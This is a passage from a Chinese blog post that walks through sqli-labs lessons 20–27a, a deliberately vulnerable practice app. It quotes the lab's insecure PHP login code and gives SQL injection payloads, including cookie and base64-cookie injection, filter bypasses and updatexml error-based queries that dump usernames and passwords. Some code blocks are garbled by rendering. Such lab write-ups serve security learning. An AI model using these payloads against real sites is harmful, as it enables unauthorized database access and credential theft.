class="line">	<span class="keyword">echo</span> <span class="string">'   &lt;input type="text"  name="uname" value=""/&gt;  &lt;/div&gt;'</span>;</span><br><span class="line">  </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' &lt;div&gt; Password : &amp;nbsp; &amp;nbsp; &amp;nbsp;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'   &lt;input type="text" name="passwd" value=""/&gt;&lt;/div&gt;&lt;/br&gt;'</span>;	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'   &lt;div style=" margin-top:9px;margin-left:90px;"&gt;&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;div style=" margin-top:10px;color:#FFF; font-size:23px; text-align:center"&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-20.jpg" /&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/center&gt;'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))   	<span class="comment">// Quote if not a number</span></span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysql_real_escape_string($value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'uname'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">	</span><br><span class="line">		$uname = check_input($_POST[<span class="string">'uname'</span>]);</span><br><span class="line">		$passwd = check_input($_POST[<span class="string">'passwd'</span>]);</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line">		$sql=<span class="string">"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1"</span>;</span><br><span class="line">		$result1 = mysql_query($sql);</span><br><span class="line">		$row1 = mysql_fetch_array($result1);</span><br><span class="line">		$cookee = $row1[<span class="string">'username'</span>];</span><br><span class="line">			<span class="keyword">if</span>($row1)</span><br><span class="line">				&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 3 &gt;'</span>;</span><br><span class="line">				setcookie(<span class="string">'uname'</span>, $cookee, time()+<span class="number">3600</span>);	</span><br><span class="line">				header (<span class="string">'Location: index.php'</span>);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"I LOVE YOU COOKIES"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size = 3 &gt;'</span>;			</span><br><span class="line">				<span class="comment">//echo 'Your Cookie is: ' .$cookee;</span></span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				print_r(mysql_error());			</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/flag.jpg" /&gt;'</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size="3"&gt;'</span>;</span><br><span class="line">				<span class="comment">//echo "Try again looser";</span></span><br><span class="line">				print_r(mysql_error());</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;			</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap.jpg" /&gt;'</span>;	</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/font&gt;'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))</span><br><span class="line">		&#123;</span><br><span class="line">			</span><br><span class="line">			$cookee = $_COOKIE[<span class="string">'uname'</span>];</span><br><span class="line">			$format = <span class="string">'D d M Y - H:i:s'</span>;</span><br><span class="line">			$timestamp = time() + <span class="number">3600</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-20.jpg" /&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;b&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;font color= "red" font size="4"&gt;'</span>;	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"YOUR USER AGENT IS : "</span>.$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;&lt;br&gt;"</span>;	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font color= "cyan" font size="4"&gt;'</span>;	</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"YOUR IP ADDRESS IS : "</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>];			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;&lt;br&gt;"</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 4 &gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;font color= "orange" font size = 5 &gt;'</span>;			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"YOUR COOKIE : uname = $cookee and expires: "</span> . date($format, $timestamp);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;/font&gt;"</span>;</span><br><span class="line">			$sql=<span class="string">"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1"</span>;</span><br><span class="line">			$result=mysql_query($sql);</span><br><span class="line">			<span class="keyword">if</span> (!$result)</span><br><span class="line">  				&#123;</span><br><span class="line">  				<span class="keyword">die</span>(<span class="string">'Issue with your mysql: '</span> . mysql_error());</span><br><span class="line">  				&#125;</span><br><span class="line">			$row = mysql_fetch_array($result);</span><br><span class="line">			<span class="keyword">if</span>($row)</span><br><span class="line">				&#123;</span><br><span class="line">			  	<span class="keyword">echo</span> <span class="string">'&lt;font color= "pink" font size="5"&gt;'</span>;	</span><br><span class="line">			  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">			  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;font color= "grey" font size="5"&gt;'</span>;  	</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">			  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;&lt;/b&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'Your ID:'</span> .$row[<span class="string">'id'</span>];</span><br><span class="line">			  	&#125;</span><br><span class="line">			<span class="keyword">else</span>	</span><br><span class="line">				&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;b&gt;"</span>;</span><br><span class="line">				<span class="comment">//echo '&lt;img src="../images/Less-20.jpg" /&gt;';</span></span><br><span class="line">				&#125;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;center&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;input  type="submit" name="submit" value="Delete Your Cookie!" /&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;/form&gt;'</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">'&lt;/center&gt;'</span>;</span><br><span class="line">		&#125;	</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;center&gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00" font size = 6 &gt;'</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">" Your Cookie is deleted"</span>;</span><br><span class="line">				setcookie(<span class="string">'uname'</span>, $row1[<span class="string">'username'</span>], time()<span class="number">-3600</span>);</span><br><span class="line">				header (<span class="string">'Location: index.php'</span>);</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;'</span>;</span><br><span class="line">		</span><br><span class="line">		&#125;		</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="comment">//header ('Location: main.php');</span></span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">//echo '&lt;img src="../images/slap.jpg" /&gt;&lt;/center&gt;';</span></span><br><span class="line">			<span class="comment">//logging the connection parameters to a file for analysis.	</span></span><br><span class="line">		$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">		fwrite($fp,<span class="string">'Cookie:'</span>.$cookee.<span class="string">"\n"</span>);</span><br><span class="line">	</span><br><span class="line">		fclose($fp);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200821174108601.png"  alt="image-20200821174108601"></p>
<p>查询语句中使用了cookee，尝试在cookies里面进行注入，抓包</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200821174908989.png"  alt="image-20200821174908989"></p>
<p>看到cookie：uname=admin，确定是cookie注入</p>
<p>在admin后加’，报错，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie: uname&#x3D;admin&#39; order by 3--+ &#x2F;&#x2F;1-3 正常</span><br><span class="line">Cookie: uname&#x3D;admin&#39; order by 4--+ &#x2F;&#x2F;4 不正常 ，确定行数为3</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie: uname&#x3D;-admin&#39; union select 1,2,database()--+</span><br></pre></td></tr></table></figure>

<h2 id="Less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入"><a href="#Less-21-Cookie-Injection-Error-Based-complex-string-基于错误的复杂的字符型Cookie注入" class="headerlink" title="Less-21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)"></a>Less-21 Cookie Injection- Error Based- complex - string ( 基于错误的复杂的字符型Cookie注入)</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200821175344820.png"  alt="image-20200821175344820"></p>
<p>uname值base64加密，其余与上一个题相同</p>
<p>上传加密语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and 1&#x3D;1 --+    &#x2F;&#x2F;明文</span><br><span class="line">YWRtaW4nIGFuZCAxPTEgLS0r    &#x2F;&#x2F;密文</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-admin&#39;) union select 1,2,database()#</span><br><span class="line">LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>



<h2 id="Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入"><a href="#Less-22-Cookie-Injection-Error-Based-Double-Quotes-string-基于错误的双引号字符型Cookie注入" class="headerlink" title="Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)"></a>Less-22 Cookie Injection- Error Based- Double Quotes - string (基于错误的双引号字符型Cookie注入)</h2><p>双引号，其余与上一题相同</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-admin&quot; union select 1,2,database()#</span><br><span class="line">LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</span><br></pre></td></tr></table></figure>



<h2 id="Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型"><a href="#Less-23-GET-Error-based-strip-comments-基于错误的，过滤注释的GET型" class="headerlink" title="Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)"></a>Less-23 GET - Error based - strip comments (基于错误的，过滤注释的GET型)</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200821175659085.png"  alt="image-20200821175659085"></p>
<p>没有输入框，考虑get型注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;&#39;</span><br></pre></td></tr></table></figure>

<p>报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;&#39; union select 1,2,database() &#39;</span><br><span class="line">?id&#x3D;&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() or &#39;1&#39;&#x3D; &#39;</span><br><span class="line">?id&#x3D;&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; or &#39;1&#39;&#x3D; &#39;</span><br><span class="line">?id&#x3D;&#39; union select 1,group_concat(username),group_concat(password) from users where 1 or &#39;1&#39; &#x3D; &#39;</span><br></pre></td></tr></table></figure>



<h2 id="Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入"><a href="#Less-24-Second-Degree-Injections-Real-treat-Store-Injections-二次注入" class="headerlink" title="Less - 24 Second Degree Injections Real treat -Store Injections (二次注入)"></a><strong>Less - 24</strong> Second Degree Injections <em>Real treat</em> -Store Injections (二次注入)</h2><p>注册用户 admin’#</p>
<p>登录后修改密码，语句成为</p>
<figure class="highlight plain"><figcaption><span>users SET passwd</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">然后用修改过的密码登录admin账号</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## **Less-25** Trick with OR &amp; AND (过滤了or和and)</span><br><span class="line"></span><br><span class="line">![image-20200829115431073](sqli-labs.assets&#x2F;image-20200829115431073.png)</span><br><span class="line"></span><br><span class="line">过滤了or和and</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;?id&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200829115520696.png"  alt="image-20200829115520696"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">报错</span><br><span class="line"></span><br><span class="line">![image-20200829115610277](sqli-labs.assets&#x2F;image-20200829115610277.png)</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;?id&#x3D;1&#39;%23</span><br></pre></td></tr></table></figure>

<p>成功，可以注入</p>
<h3 id="使用union查询"><a href="#使用union查询" class="headerlink" title="使用union查询"></a>使用union查询</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">?id=-1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>()<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200829115753647.png"  alt="image-20200829115753647"></p>
<p>注意犹豫过滤了or，将password改成passwoorrd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(username,0x7e,passwoorrd) from users--+</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200829115901068.png"  alt="image-20200829115901068"></p>
<h3 id="双写or和and"><a href="#双写or和and" class="headerlink" title="双写or和and"></a>双写or和and</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0&#39; oorr 1&#x3D;1 --+</span><br><span class="line">?id&#x3D;2&#39; aandnd 1&#x3D;1 --+</span><br></pre></td></tr></table></figure>

<p>成功</p>
<h2 id="Less-26-failed-Trick-with-comments-and-space-过滤了注释和空格的注入"><a href="#Less-26-failed-Trick-with-comments-and-space-过滤了注释和空格的注入" class="headerlink" title="Less-26(failed) Trick with comments and space (过滤了注释和空格的注入)"></a><strong>Less-26(failed)</strong> Trick with comments and space (过滤了注释和空格的注入)</h2><p>借鉴：<a href="https://www.jianshu.com/p/ff72f2c6d99c" target="_blank" rel="noopener">https://www.jianshu.com/p/ff72f2c6d99c</a></p>
<p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id = blacklist($id);</span><br><span class="line">$hint =$id;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id = preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>,$id);             <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    $id = preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>,$id);            <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    $id = preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>,$id);          <span class="comment">//strip out /*</span></span><br><span class="line">    $id = preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>,$id);            <span class="comment">//Strip out --</span></span><br><span class="line">    $id = preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>,$id);             <span class="comment">//Strip out #</span></span><br><span class="line">    $id = preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>,$id);            <span class="comment">//Strip out spaces</span></span><br><span class="line">    $id = preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>,$id);        <span class="comment">//Strip out slashes</span></span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>不仅过滤了上一关的<code>or</code>与<code>and</code>，还过滤了单行注释<code>--</code>与<code>#(含URL编码)</code>以及多行注释<code>/**/</code>（被解释为空格，常用于过滤空格时），还过滤了<code>(空格)</code>，以及正反斜杠<code>/</code>与<code>\</code>。</p>
<p>使用%a0绕过，没有成功</p>
<h3 id="updatexml注入"><a href="#updatexml注入" class="headerlink" title="updatexml注入"></a>updatexml注入</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0&#39;||updatexml(1,concat(&#39;$&#39;,(database())),0)||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200829123019418.png"  alt="image-20200829123019418"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;0&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema&#x3D;&#39;security&#39;))),0)||&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200829123117750.png"  alt="image-20200829123117750"></p>
<h2 id="less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）"><a href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-（过滤了union和select的）" class="headerlink" title="less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us （过滤了union和select的）</h2><p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/image-20200829123418086.png"  alt="image-20200829123418086"></p>
<p>没有过滤大写的关键字</p>
<p>把or换成&amp;&amp;（%26%26）</p>
<p>题解里面写的用%a0绕过空格过滤，我这里没有成功</p>
<h2 id="less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><a href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us" class="headerlink" title="less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us"></a>less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</h2><p>双引号型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot;and(length(database())&gt;7)%a0uNion%a0sELect%a01,2,&quot;3</span><br></pre></td></tr></table></figure>

<p>同样，%a0过滤不成功</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Michelle19l</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://gitee.com/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/">https://gitee.com/michelle19l/michelle19l/2020/08/29/sqli/sqli-labs/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/timg.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> Donate<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/wechat.jpg" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/alipay.jpg" alt="支付寶"/><div class="post-qr-code__desc">支付寶</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2020/09/21/sagemath%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"><img class="prev_cover lazyload" data-src="/img/timg.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">sagemath使用教程</div></div></a></div><div class="next-post pull_right"><a href="/2020/08/07/python/%E9%9B%B6%E6%95%A3%E7%AC%94%E8%AE%B0/"><img class="next_cover lazyload" data-src="/img/timg.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">python/零散笔记</div></div></a></div></nav></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Michelle19l</div><div class="framework-info"><span>Driven </span><a href="https://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://michelle19l.gitee.io/">blog</a>!</div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="Read Mode"></i><i class="fa fa-plus" id="font_plus" title="Increase font size"></i><i class="fa fa-minus" id="font_minus" title="Decrease font size"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="Traditional Chinese and Simplified Chinese Conversion" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="Dark Mode"></i></div><div id="rightside-config-show"><div id="rightside_config" title="Setting"><i class="fa fa-cog" aria-hidden="true"></i></div><i class="fa fa-list-ul close" id="mobile-toc-button" title="Table of Contents" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="Back to top" aria-hidden="true"></i></div></section><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="canvas_nest" color="87,250,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="/js/third-party/canvas-nest.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><script src="/js/search/local-search.js"></script></body></html>